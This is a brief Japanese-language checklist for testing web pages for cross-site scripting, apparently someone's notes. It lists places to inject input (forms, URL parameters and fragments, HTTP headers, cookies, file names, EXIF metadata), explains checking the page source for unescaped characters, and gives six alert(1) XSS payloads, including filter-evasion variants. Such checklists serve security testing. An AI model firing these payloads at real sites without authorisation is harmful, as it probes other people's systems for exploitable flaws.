

"'<>&　　を以下に入力する

検索窓

ログイン・会員登録フォーム

お問い合わせ・コメント欄

プロフィール編集画面（名前、自己紹介など)

URLのクエリパラメータ (`?id=`, `?lang=`, `?q=`)

URLのフラグメント (`#section`)

HTTP ヘッダー (User-Agent, Referer) ※アクセス解析ツールで表示される際に発火

Cookie の値 (ページ内でユーザー名を表示する際など)

アップロードするファイル名
画像のメタデータ (EXIF情報のコメント欄など)

ページのソースを表示（Ctrl + U）する。
入力した記号が &lt; などに変換されず、そのまま表示されている場所があれば脆弱






# XSSchecklist

```
<script>alert(1)</script>
```

```
<img src=x onerror=alert(1)>
```

```
<sCrIpT>alert(1)</sCrIpT>
```

```
"><script>alert(1)</script>
```

```
<scr<script>ipt>alert(1)</script>
```

```
<a href="javascript:alert(1)">Click Me</a>
```
